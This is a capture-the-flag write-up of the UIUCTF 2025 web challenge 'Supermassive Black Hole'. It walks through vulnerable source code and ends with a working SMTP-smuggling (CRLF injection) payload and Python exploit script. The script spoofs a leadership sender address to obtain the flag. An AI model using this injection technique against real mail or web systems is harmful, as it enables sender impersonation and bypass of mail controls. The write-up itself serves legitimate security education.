---
title: UIUCTF 25 - Supermassive Black Hole
date: 2025-07-30
lastmod: 2025-07-30T13:00:30+02:00
categories:
  - writeup
  - uiuctf25
tags:
  - web
  - python
  - CRLF injection
  - medium
authors:
  - Valenter
---
*Black Hole Ticketing Services prides itself on losing tickets at the speed of light. Can you get them to escalate?*

Welcome back to the second installment in this series of cyber-spacefaring challenges from uiuctf.

![Homepage](/uiuctf2025/supermassive-black-hole/screenshot-1.png)
Not as fancy as [*Ruler of the Universe*]({{< ref "posts/uiuctf25-ruler-of-the-universe/index.md" >}}), but far less dystopian than some real-world customer service centers.

The *About us* page contains some useful information, namely leadership@blackholeticketing.com, that will come in handy later.

![About-us](/uiuctf2025/supermassive-black-hole/screenshot-2.png)

## Dissecting the Event‑Horizon Mail Hub

There's an SMTP server running internally on port 1025, unfortunately, the port isn't exposed to us, so we can't interact with it directly:

`smtp_server.py`
```python
async def start_server():
    init_database()

    it_handler = ITBotHandler()
    controller = Controller(it_handler, hostname='localhost', port=1025)

    controller.start()

    return controller

async def main():
    controller = await start_server()

    try:
        while True:
            await asyncio.sleep(5)
    except KeyboardInterrupt:
        controller.stop()

if __name__ == "__main__":
    asyncio.run(main())
```

Luckily, though, we don't need to, the server does all the work for us, everything we type into the ticket submission form gets conveniently inserted into a pre-packaged `message` and relayed to the SMTP listener:

`web_server.py`
```python
        message_data = f"""\
From: support@blackholeticketing.com\r\n\
To: it@blackholeticketing.com\r\n\
Subject: {subject}\r\n\
X-Ticket-ID: {ticket_id}\r\n\
\r\n\
{message}\r\n\
.\r\n""".encode()

        ending_count = message_data.count(b'\r\n.\r\n')
        if ending_count != 1:
            raise ValueError("Bad Request")

        with smtplib.SMTP('localhost', 1025) as client:
            client.helo("example.com")
            client.sendmail('support@blackholeticketing.com', ['it@blackholeticketing.com'], message_data)
            # Wait a second for SMTP to process the ticket
            time.sleep(1)

        ticket_data = {
            'id': ticket_id,
            'timestamp': int(time.time() * 1000),
            'from': 'support@blackholeticketing.com',
            'subject': subject,
            'body': message,
            'status': 'submitted'
        }

        return render_template('ticket_submitted.html', ticket_data=ticket_data)
```

If we can somehow manage to change the sender address to leadership@blackholeticketing.com, and impersonate their star‑fleet commander‑in‑chief, the server will print out the flag for us.

`smtp_server.py`
```python
from_header = message.get('From', 'Unknown')
subject = message.get('Subject', 'No Subject')
body = str(message.get_payload())
ticket_id = message.get('X-Ticket-ID', f'{int(time.time())}_{self.processed_count}')

if internal.leadership_email in from_header.lower():
    response = "C-Suite ticket received! Will escalate immediately!" + f"\n{internal.flag}"
elif internal.support_email in from_header.lower():
    response = "Request for support received! Will resolve after lunch break."
else:
    response = "Please use our support portal to submit a ticket."
```

Now, the Intergalactic Postal Center must suffer from the same understaffing and underpaying issues we have here on Earth, because somebody decided it would be a good idea to override every inherent safety function in the Python SMTP library:

```python
try:
    smtplib._fix_eols = return_unchanged
    smtplib._quote_periods = return_unchanged
    smtplib.SMTP.data = new_data
```

- **`_fix_eols`** normally converts `\n` into `\r\n` to follow the SMTP standard,
- **`_quote_periods`** does dot-stuffing (adds an extra period at the start of every line that begins with a period),
- **`SMTP.data`** was patched with `new_data`.

It instead only runs one check:

```python
ending_count = message_data.count(b'\r\n.\r\n')
if ending_count != 1:
    raise ValueError("Bad Request")
```
it counts the number of terminators and allows there to be only one, this is to prevent us from closing our message and crafting a new one inside the same input.
But since `fix_eols` is deactivated, this is vulnerable to **CRLF injection**.

## Examining the vulnerability

We can use `\n.\r\n`, a.k.a *LF‑dot‑CRLF*, to close our crafted message, the SMTP server will recognize a dot-only line as end-of-DATA, and everything that follows (`MAIL FROM:…`, `RCPT TO:…`, etc.) will be interpreted  as new SMTP commands.

#### The payload

```smtp
"\n.\r\n"
"MAIL FROM:<ceo@supermassive.inc>\r\n"
"RCPT TO:<it@blackholeticketing.com>\r\n"
"DATA\r\n"
"From: leadership@blackholeticketing.com\r\n"
"To: it@blackholeticketing.com\r\n"
"Subject: escalate\r\n"
"X-Ticket-ID: 1444\r\n"
"\r\n"
"pls fix asap\r\n"
".\n"
```
*Ticket-ID was added only for convenience and is not necessary for the final exploit*

Thus we add our own custom sender and receiver and pass the message on to the server.
#### Final script

```python
#!/usr/bin/env python3
import requests, time, textwrap

#BASE = "http://localhost:8080"
BASE = "https://inst-4e64969ec136b504-supermassive-black-hole.chal.uiuc.tf/"

payload = (
    "\n.\r\n"
    "MAIL FROM:<ceo@supermassive.inc>\r\n"
    "RCPT TO:<it@blackholeticketing.com>\r\n"
    "DATA\r\n"
    "From: leadership@blackholeticketing.com\r\n"
    "To: it@blackholeticketing.com\r\n"
    "Subject: escalate\r\n"
    "X-Ticket-ID: 1444\r\n"
    "\r\n"
    "pls fix asap\r\n"
    ".\n"
)

#injection ticket
requests.post(f"{BASE}/submit_ticket",
              data={"subject": "Outage", "message": payload})

#wait for the bot to process
time.sleep(2)


resp = requests.get(f"{BASE}/check_response/1444").json()
print(resp["response"])
```

**`uiuctf{7h15_c0uld_h4v3_b33n_4_5l4ck_m355463_8091732490}`**
